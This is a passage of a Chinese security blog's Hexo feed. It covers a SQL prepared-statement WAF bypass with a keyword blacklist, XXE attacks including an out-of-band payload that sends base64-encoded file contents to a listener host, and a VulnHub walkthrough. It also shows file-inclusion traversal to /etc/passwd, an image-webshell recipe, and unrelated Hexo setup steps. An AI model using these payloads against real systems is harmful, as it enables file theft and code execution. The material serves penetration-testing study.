获取结果 <span class="hljs-keyword">fetch</span> <span class="hljs-keyword">select</span><br><span class="hljs-keyword">FETCH</span> statement_name <span class="hljs-keyword">INTO</span> <span class="hljs-variable">@result</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span>;<br># <span class="hljs-number">5.</span> 清理资源<br><span class="hljs-keyword">DEALLOCATE</span> <span class="hljs-keyword">PREPARE</span> statement_name;<br></code></pre></td></tr></table></figure><p>使用预编译后，用户提交的参数会绑定到查询的变量位置，无法再将 SQL 语句闭合，所以预编译是防止 SQL 注入的一种方法。</p><p>但在堆叠注入的情况下，如果用户可以执行 SQL 语句，那么也可以利用 SQL 预编译来造成危害。</p><p>比如：站点存在 堆叠注入，但 WAF 过滤了 SELECT 等查询语句。这时我们可以通过 <code>CONCAT</code> 拼接字段构成 SQL 预编译模板，再执行 SQL 语句。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@sql</span> <span class="hljs-operator">=</span> CONCAT(<span class="hljs-string">&#x27;se&#x27;</span>,<span class="hljs-string">&#x27;lect * from user&#x27;</span>);<br><span class="hljs-keyword">PREPARE</span> statement_name <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@sql</span>;<br><span class="hljs-keyword">EXECUTE</span> statement_name;<br></code></pre></td></tr></table></figure><h3 id="严格的数据类型"><a href="#严格的数据类型" class="headerlink" title="严格的数据类型"></a>严格的数据类型</h3><p>对于数字型参数的查询，直接将参数进行强制类型转换，可以直接达到预防效果。</p><h3 id="过滤转义"><a href="#过滤转义" class="headerlink" title="过滤转义"></a>过滤转义</h3><p>转义处理：对进入数据库的特殊字符进行转义处理，或编码转换，使其无法闭合。</p><p>过滤字符：添加过滤黑名单，匹配到就不往下执行 SQL 语句，直接返回</p><ul><li>联合注入中的：<code>order|union|select|......</code></li><li>报错注入中的：<code>floor|update......</code></li><li>布尔盲注中的：<code>substr|length|ascii.....</code></li><li>延时盲注中的：<code>sleep...</code></li></ul><h3 id="避免报错信息"><a href="#避免报错信息" class="headerlink" title="避免报错信息"></a>避免报错信息</h3><p>报错信息的回显就是报错注入的产生原因。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>WEB漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE 漏洞</title>
    <link href="/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/XXE/"/>
    <url>/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/XXE/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE-漏洞"><a href="#XXE-漏洞" class="headerlink" title="XXE 漏洞"></a>XXE 漏洞</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>XML 指可扩展标记语言（eXtensible Markup Language）。</p><ul><li>XML 被设计用来传输和存储数据。</li><li>HTML 被设计用来显示数据。</li><li>HTML 旨在显示信息，而 XML 旨在传输信息。</li></ul><p>XML 特性：</p><ul><li>XML 没有预定义的标签，它允许创作者定义自己的标签和自己的文档结构。</li></ul><p>XML文档结构包括：</p><ul><li>XML声明</li><li>DTD 文档类型定义（可选）</li><li>文档元素</li></ul><p>XML-DTD 格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!--XML声明--&gt;<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br><br>&lt;!--DTD，这部分可选的--&gt;          <br>&lt;!DOCTYPE foo [ <br>    &lt;!ELEMENT foo ANY &gt;<br>    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;<br>]&gt;<br><br>&lt;!--文档元素--&gt;                                                                          <br>&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br></code></pre></td></tr></table></figure><p>DTD - 文档类型定义其使用一系列合法的元素来定义文档的结构。</p><p>在 DTD 中，有一个叫 “实体” 的东西，其用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>使用方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">DTD example:<br><br>&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;<br>&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;<br><br>XML example：<br><br>&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;<br></code></pre></td></tr></table></figure><p>在 DTD 中定义 <code>writer、copyright</code> 实体，然后在下面的 XML 中引用了这 2 给实体，应用格式就是 <code>&amp;实体名;</code> 的格式。</p><p>上面的是引用本地 DTD 实体，其还可以从外部引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">DTD example:<br><br>&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;<br>&lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;<br><br>XML example:<br><br>&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;<br></code></pre></td></tr></table></figure><p>可以看到上面的实体是从一个 HTTP 链接获取的，且它不仅仅支持 HTTP 还支持如下协议：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081548172.png" alt="image-20230908154850073"></p><p>可以看到有些协议是可以造成一些攻击的，其实还是 SSRF 那里的协议利用手法。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>XXE 又叫 XML 外部实体注入，从上面可以看到在引用外部实体时，其可以解析一些危险的外部协议，其攻击手法其实就是利用这些协议去操作攻击。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version = &quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///D:/fuming.txt&quot;&gt; ]&gt;<br>&lt;x&gt;&amp;xxe;&lt;/x&gt;<br></code></pre></td></tr></table></figure><h4 id="内网探针"><a href="#内网探针" class="headerlink" title="内网探针"></a>内网探针</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE foo [ <br>&lt;!ELEMENT foo ANY &gt; <br>&lt;!ENTITY rabbit SYSTEM &quot;http://localhost/index.txt&quot; &gt; <br>]&gt;<br>&lt;x&gt;&amp;rabbit;&lt;/x&gt;<br></code></pre></td></tr></table></figure><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version = &quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt; ]&gt;<br>&lt;x&gt;&amp;xxe;&lt;/x&gt;<br></code></pre></td></tr></table></figure><h4 id="引入外部实体-DTD"><a href="#引入外部实体-DTD" class="headerlink" title="引入外部实体 DTD"></a>引入外部实体 DTD</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; ?&gt;<br>&lt;!DOCTYPE test [<br>&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:8081/evil2.dtd&quot;&gt;<br>%file;<br>]&gt;<br>&lt;x&gt;&amp;send;&lt;/x&gt;<br></code></pre></td></tr></table></figure><p><code>evil2.dtd</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt;<br></code></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h4><p>先使用 <code>php://filter</code> 获取目标文件的内容，然后将内容以 <code>http</code> 请求发送到接受数据的服务器，接收端通过日志或者构造文件接收数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test [<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=test.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.0.103:8081/test.dtd&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>test.dtd：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload<br>&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.0.103:8081/?data=%file;&#x27;&gt;&quot;<br>&gt;<br>%payload;<br></code></pre></td></tr></table></figure><h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><p>所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。</p><p>参考链接：<a href="https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/">https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</a></p><h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><h2 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h2><p>项目地址：<a href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081602062.png" alt="image-20221030172237591"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">184.130</span>/<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081602056.png" alt="image-20221030172439452"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">184.130</span><span class="hljs-regexp">/xxe/</span><br></code></pre></td></tr></table></figure><p>登陆：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081602059.png" alt="image-20221030172555936"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081602067.png" alt="image-20221030172651850"></p><p>可以看到是 XML 格式的输入，那么就可以构造 Payload 了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;&gt; ]&gt;<br>&lt;root&gt;<br>&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;password&gt;fuming&lt;/password&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><p>读取 admin.php，Base64解密：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Here is the &lt;a style=&#x27;color:FF0000;&#x27; href=&#x27;/flagmeout.php&#x27;&gt;Flag&lt;/a&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p>得到 Flag 信息，在 ‘&#x2F;flagmeout.php’，用 XXE 读一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flagmeout.php&quot;&gt; ]&gt;<br>&lt;root&gt;<br>&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;password&gt;fuming&lt;/password&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><p>Base64 解码：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081602077.png" alt="image-20221030174058341"></p><p>这里又是一个 Base32 解码：<br><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081602080.png" alt="image-20221030174455618"></p><p>解出来又是 Base64：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081602498.png" alt="image-20221030174521850"></p><p>XXE 读取 flag.php ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/.flag.php&quot;&gt; ]&gt;<br>&lt;root&gt;<br>&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;password&gt;fuming&lt;/password&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081602513.png" alt="image-20221030174741137"></p><p>直接执行 PHP 文件：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081602527.png" alt="image-20221030175220800"></p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>黑盒：看到参数是 XML，或者可以接受 XML 类型的参数即可测试</p><p>白盒：寻找解析 XML 的相关函数</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>禁用外部实体加载</li><li>对 XML 内容进行过滤</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>WEB漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>文件包含是 PHP 中的一个功能，通过文件包含函数将目标文件包含进来，直接使用被包含文件的代码。当目标文件中没有 PHP 代码时，会直接显示文件内容。</p><p>漏洞原理：文件包含参数可控，导致包含攻击者恶意的文件，造成 PHP 代码执行或敏感文件读取。</p><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><ul><li><code>include()</code>：执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</li><li><code>require()</code>：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本</li><li><code>include_once( )</code>：功能与 <code>include()</code> 相同，区别在于当重复调用同一文件时，程序只调用一次</li><li><code>require_once( )</code>：功能与 <code>require()</code> 相同，区别在于当重复调用同一文件时，程序只调用一次</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>本地文件包含：包含服务器本地的文件</li><li>远程文件包含：包含其他服务器上的文件</li></ul><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>本地文件包含漏洞利用：</p><ul><li>读取文件</li><li>代码执行</li><li>PHP 伪协议</li></ul><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">filename=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><ul><li>图片马包含</li><li>日志文件包含</li><li><code>environ</code> 文件包含</li><li><code>session</code> 文件包含</li><li><code>phpinfo</code> 临时文件包含</li></ul><p>这里只写一下图片吗和日志文件，其他情况了遇到了在记录。</p><h5 id="图片马包含"><a href="#图片马包含" class="headerlink" title="图片马包含"></a>图片马包含</h5><p>在图片中插入木马，上传该图片后包含即可，这也是最常用的方法，其他的在 CTF 或者靶机中较为常见 。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">copy</span> logo.png/b+<span class="hljs-keyword">shell</span>.php <span class="hljs-keyword">shell</span>.jpg<br></code></pre></td></tr></table></figure><h5 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h5><p>我们构造恶意的代码去访问对应的服务，这个服务的日志就会将代码记录下来，包含该日志文件即可。</p><p>日志文件如 中间件日志、SSH日志等等。</p><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>PHP 中封装着一系列的协议，而它可以用于一些函数中，恰巧我们的文件包含函数就可以利用这些协议，然后根据伪协议功能不同去造成不同的危害。</p><p>这里也只是简单写一下，这方法属于是 CTF 方面的常用方法，也不打 CTF 了，就不写详细的。</p><p><a href="https://www.cnblogs.com/wjrblogs/p/12285202.html">CTF中常用的php伪协议利用</a></p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p><code>php.ini</code> 配置要求：</p><ol><li><code>allow_url_include、allow_url_fopen</code> 开启</li><li><code>PHP &lt; 5.3.0 </code>时，<code>magic_quotes_gpc</code> 需要关闭</li></ol><p>直接构造 Shell，然后远程包含即可。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>WEB漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo博客搭建</title>
    <link href="/2023/05/21/%E5%85%B6%E4%BB%96%E6%96%87%E7%AB%A0/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/05/21/%E5%85%B6%E4%BB%96%E6%96%87%E7%AB%A0/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo-博客搭建"><a href="#Hexo-博客搭建" class="headerlink" title="Hexo 博客搭建"></a>Hexo 博客搭建</h1><p>之前博客的域名和服务器都过期了，续费太贵了。找了一下发现可以使用 <code>Hexo + Gitee/Github</code> 搭建博客，免费。 </p><p>Hexo 文档：<a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境搭建：</p><ul><li>Gitee Pages 服务 &#x2F; GitHub</li><li>Hexo 静态博客框架</li></ul><h3 id="Gitee-Pages-服务"><a href="#Gitee-Pages-服务" class="headerlink" title="Gitee Pages 服务"></a>Gitee Pages 服务</h3><p>在 Gitee 上创建一个和用户名相同名字的仓库，然后点击 “服务” -&gt; Gitee Pages 进行申请。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230528202445179.png" alt="image-20230528202445179"></p><h3 id="GitHub-Pages"><a href="#GitHub-Pages" class="headerlink" title="GitHub Pages"></a>GitHub Pages</h3><p>github 不需要审核，由于 github 的原因，打开速度可能会有点慢，不过其实影响不大。</p><p>创建一个 公开的 ，名字为 <code>username.github.io</code> 的仓库即可，比如：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230530095026815.png" alt="image-20230530095026815"></p><h3 id="SSH-公钥配置"><a href="#SSH-公钥配置" class="headerlink" title="SSH 公钥配置"></a>SSH 公钥配置</h3><p><a href="https://fuyoumingyan.github.io/2023/05/29/git-study/#SSH-%E9%85%8D%E7%BD%AE">看这里</a></p><h3 id="Hexo-搭建"><a href="#Hexo-搭建" class="headerlink" title="Hexo 搭建"></a>Hexo 搭建</h3><p>搭建流程：</p><ol><li>安装 Node.js</li><li>使用 npm 安装 Hexo</li></ol><h4 id="1-安装-Node-js"><a href="#1-安装-Node-js" class="headerlink" title="1.安装 Node.js"></a>1.安装 Node.js</h4><p>官网：<a href="https://nodejs.org/zh-cn/">https://nodejs.org/zh-cn/</a></p><h4 id="2-安装-Hexo"><a href="#2-安装-Hexo" class="headerlink" title="2.安装 Hexo"></a>2.安装 Hexo</h4><p>打开 <code>Git Bash</code> 或者命令窗口，使用 <code>npm</code> 安装 <code>hexo</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 直接使用 npm 安装 hexo-cli</span><br>npm install hexo-cli -g<br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 使用淘宝 npm 镜像安装 hexo-cli</span><br>npm install -g cnpm --registry=https://registry.npm.taobao.org<br>cnpm install hexo-cli -g<br></code></pre></td></tr></table></figure><h3 id="初始化博客"><a href="#初始化博客" class="headerlink" title="初始化博客"></a>初始化博客</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo init &lt;folder&gt;<br>cd &lt;folder&gt;<br>npm install<br></code></pre></td></tr></table></figure><h3 id="启动博客"><a href="#启动博客" class="headerlink" title="启动博客"></a>启动博客</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo clean# 清除缓存文件 (db.json) 和已生成的静态文件 (public)<br>hexo g# hexo generate 生成静态文件<br>hexo s# hexo server 启动服务器<br></code></pre></td></tr></table></figure><p>每一次启动都需要执行这 3 个命令，可以把它们放到一个 <code>sh</code> 脚本中，之后直接运行即可。</p><h3 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h3><p>Fluid 主题配置：<a href="https://hexo.fluid-dev.com/docs/">https://hexo.fluid-dev.com/docs/</a></p><h4 id="1-下载主题"><a href="#1-下载主题" class="headerlink" title="1.下载主题"></a>1.下载主题</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd themes<br>git clone https://gitee.com/mirrors/hexo-theme-fluid.git fluid<br></code></pre></td></tr></table></figure><h4 id="2-覆盖配置"><a href="#2-覆盖配置" class="headerlink" title="2.覆盖配置"></a>2.覆盖配置</h4><p>复制 <code>_config.yml</code> ，重命名为 <code>_config.fluid.yml</code> ；</p><h4 id="3-修改Hexo配置"><a href="#3-修改Hexo配置" class="headerlink" title="3.修改Hexo配置"></a>3.修改Hexo配置</h4><p>修改  <code>_config.fluid.yml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 站点信息(标题/作者/语言)</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">fuyoumingyan&#x27;s</span> <span class="hljs-string">blog</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">fuming</span><br><span class="hljs-attr">language:</span> <span class="hljs-string">zh-CN</span><br><span class="hljs-comment"># 选择主题(fluid)</span><br><span class="hljs-attr">theme:</span> <span class="hljs-string">fluid</span><br></code></pre></td></tr></table></figure><h4 id="4-修改主题配置"><a href="#4-修改主题配置" class="headerlink" title="4.修改主题配置"></a>4.修改主题配置</h4><p><code>themes\fluid</code> 目录下的 <code>_config.yml</code>；</p><p>修改同上；</p><h4 id="5-创建关于页面"><a href="#5-创建关于页面" class="headerlink" title="5.创建关于页面"></a>5.创建关于页面</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建 about 页面</span><br>hexo new page about<br><span class="hljs-meta prompt_"># </span><span class="language-bash">添加 layout 属性</span><br>layout: about<br></code></pre></td></tr></table></figure><h2 id="图床搭建"><a href="#图床搭建" class="headerlink" title="图床搭建"></a>图床搭建</h2><p>Hexo 对于图片很不方便，直接搭建图床即可，费用便宜有不费事。</p><p>使用工具：</p><ul><li>腾讯云 COS ( 对象存储服务 )</li><li><a href="https://molunerfinn.com/PicGo/">PicGo</a> ( 图床 )</li><li>Typora</li></ul><h3 id="腾讯云-COS"><a href="#腾讯云-COS" class="headerlink" title="腾讯云 COS"></a>腾讯云 COS</h3><h4 id="1-创建存储桶"><a href="#1-创建存储桶" class="headerlink" title="1.创建存储桶"></a>1.创建存储桶</h4><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230528171752495.png" alt="image-20230528171752495"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230528171846922.png" alt="image-20230528171846922"></p><p>之后有域名开启防盗链。</p><h4 id="2-购买资源包"><a href="#2-购买资源包" class="headerlink" title="2.购买资源包"></a>2.购买资源包</h4><p>资源包有 3 种，这里关注的主要资源是 <code>存储容量</code> 和 <code>流量</code> 。</p><p><code>读写请求</code> 可能在这种情况下相对较低，因为你主要是上传和下载图片文件。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230528172606722.png" alt="image-20230528172606722"></p><h3 id="PicGo"><a href="#PicGo" class="headerlink" title="PicGo"></a>PicGo</h3><p>官网：<a href="https://molunerfinn.com/PicGo/">https://molunerfinn.com/PicGo/</a></p><p>图床设置 -&gt; 腾讯云 COS</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230528172822673.png" alt="image-20230528172822673"></p><p><code>AppId、SecretId、SecretKey</code>：<a href="https://console.cloud.tencent.com/capi">API 密钥管理</a></p><p><code>Bucket</code> ：存储通名称</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230528173813481.png" alt="image-20230528173813481"></p><p>上传图片测试即可。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230528173040303.png" alt="image-20230528173040303"></p><h3 id="typora"><a href="#typora" class="headerlink" title="typora"></a>typora</h3><p><img 